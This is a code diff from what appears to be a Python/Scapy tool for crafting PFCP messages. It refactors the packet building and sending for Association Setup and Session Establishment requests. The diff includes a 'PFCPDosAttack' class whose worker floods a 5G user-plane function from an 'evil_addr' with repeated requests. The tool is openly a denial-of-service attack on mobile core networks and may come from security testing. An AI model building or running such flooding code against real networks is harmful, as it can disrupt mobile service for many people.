@@ -29,9 +29,7 @@ class Ez_PFCP:
             self.seq = 1
         return seq
     
-    
-    
-    def Send_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+    def Build_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -53,16 +51,10 @@ class Ez_PFCP:
 
         packet = IP(src=src_addr, dst=dest_addr)/UDP(sport=src_port, dport=dest_port)/pfcp_msg
         packet = packet.__class__(bytes(packet))
-        if self.verbose:
-            print(f"[EZ-PFCP] PFCP Association Setup packet:")
-            # packet.show()
-        send(packet)
-        if self.verbose:
-            print(f"[EZ-PFCP] PFCP Association Setup packet sent")
-            
-    def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
+        return packet
+    
+    def Build_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                             seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1):
-        src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
@@ -99,15 +91,53 @@ class Ez_PFCP:
 
         pkt = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
         pkt = pkt.__class__(bytes(pkt))  # Recalcul final
+        return pkt
 
 
+
+
+
+    def Send_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+        src_addr = src_addr or self.src_addr
+        dest_addr = dest_addr or self.dest_addr
+        src_port = src_port or self.src_port
+        dest_port = dest_port or self.dest_port
+        seq = self.new_seq()
+        
+        pfcp_association_setup_req = self.Build_PFCP_association_setup_req(
+            src_addr=src_addr,
+            dest_addr=dest_addr,
+            src_port=src_port,
+            dest_port=dest_port
+        )
+        send(pfcp_association_setup_req)
         if self.verbose:
-            print(f"[EZ-PFCP] Sending PFCP Session Establishment Packet:")
-            # pkt.show()
-        send(pkt)
+            print(f"[EZ-PFCP] PFCP Association Setup packet sent")
+            
+            
+    def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
+                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1):
+        src_addr = src_addr or self.src_addr
+        dest_addr = dest_addr or self.dest_addr
+        src_port = src_port or self.src_port
+        dest_port = dest_port or self.dest_port
+        seid = seid or self.seid
+        seq = self.new_seq()
+        
+        pfcp_session_establishment_req = self.Build_PFCP_session_establishment_req(
+            src_addr=src_addr,
+            dest_addr=dest_addr,
+            src_port=src_port,
+            dest_port=dest_port,
+            seid=seid,
+            ue_addr=ue_addr,
+            teid=teid,
+            precedence=precedence,
+            interface=interface
+        )
+        send(pfcp_session_establishment_req)
         if self.verbose:
-            print(f"[EZ-PFCP] PFCP Session Establishment Packet sent.")
-
+            print(f"[EZ-PFCP] PFCP Session Establishment packet sent")
 
         
         
@@ -173,7 +203,7 @@ class PFCPDosAttack:
     def pfcp_session_establishment_flood_worker(self, count):
         if self.verbose:
             print(f"[DoS][Worker] Worker starts flooding with {count} requests")
-        ezpfcp = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
+        ezpfcp = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=False)
         
         for i in range(count):
             ezpfcp.Send_PFCP_association_setup_req()
